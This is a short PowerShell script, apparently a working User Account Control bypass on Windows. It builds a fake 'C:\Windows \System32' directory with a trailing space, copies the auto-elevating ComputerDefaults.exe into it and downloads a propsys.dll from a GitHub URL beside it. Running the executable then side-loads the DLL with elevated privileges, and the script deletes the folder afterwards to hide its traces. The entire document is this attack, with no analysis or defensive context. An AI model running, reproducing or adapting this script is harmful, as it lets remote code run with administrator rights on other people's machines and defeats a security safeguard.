New-Item -Path "\\?\C:\Windows " -ItemType Directory -Force | Out-Null
New-Item -Path "\\?\C:\Windows \System32" -ItemType Directory -Force | Out-Null
Copy-Item "C:\Windows\System32\ComputerDefaults.exe" "C:\Windows \System32\" -Force -ErrorAction SilentlyContinue
$DllUrl = "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/propsys.dll"
$Destination = "C:\Windows \System32\propsys.dll"
Invoke-WebRequest -Uri $DllUrl -OutFile $Destination -UseBasicParsing
$proc = Start-Process "C:\Windows \System32\ComputerDefaults.exe" -PassThru
Start-Sleep -Seconds 30
Remove-Item "C:\Windows \System32\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "C:\Windows \" -Force -Recurse -ErrorAction SilentlyContinue
